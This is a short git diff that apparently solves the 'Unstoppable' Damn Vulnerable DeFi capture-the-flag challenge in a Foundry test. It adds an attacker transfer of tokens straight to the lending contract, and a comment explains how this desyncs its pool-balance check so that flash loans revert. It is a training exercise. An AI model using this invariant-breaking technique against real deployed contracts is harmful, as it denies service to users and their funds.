@@ -60,6 +60,9 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        dvt.transfer(address(unstoppableLender), 10);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -75,3 +78,6 @@ contract Unstoppable is Test {
         vm.stopPrank();
     }
 }
+
+// Exploit explanation: flash loan function in unstoppableLender contract is checking the poolbalance( updated through deposit token function) but one can send tokens to the contract through transfer function and the pool balance will not be updated.
+// So the flash loan function will revert due to the condition which checks the pool balance and balancebefore.
